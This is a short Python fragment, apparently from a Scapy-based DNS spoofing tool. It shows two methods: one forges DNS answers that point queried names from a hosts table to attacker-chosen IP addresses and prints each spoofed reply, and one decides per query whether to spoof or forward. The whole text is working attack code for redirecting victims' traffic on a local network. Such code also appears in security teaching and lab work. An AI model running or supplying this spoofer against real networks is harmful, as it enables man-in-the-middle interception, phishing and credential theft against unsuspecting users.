def spoof(self, req_pkt):
    # spoofing ip based on hosts dictionary
    spoof_ip = self.hosts.get(req_pkt[DNS].qd.qname, None)
    if spoof_ip:
        spf_resp =  IP(dst=req_pkt[IP].src, src=self.local_server.ip)\
                    /UDP(dport=req_pkt[UDP].sport, sport=53)\
                    / self.generate_response(req_pkt, ip=spoof_ip)

        send(spf_resp, verbose=0, iface=interface)
        print("[+] Spoofed response to: {} | {} is at {}".format(spf_resp[IP].dst, str(req_pkt["DNS Question Record"].qname), spoof_ip))
        
def handle_queries(self, req_pkt):
    """ decides whether to spoof or forward the packet """ 
    if self.hosts.get(req_pkt["DNS Question Record"].qname, None):
        self.spoof(req_pkt)
    else:
        self.forward(req_pkt)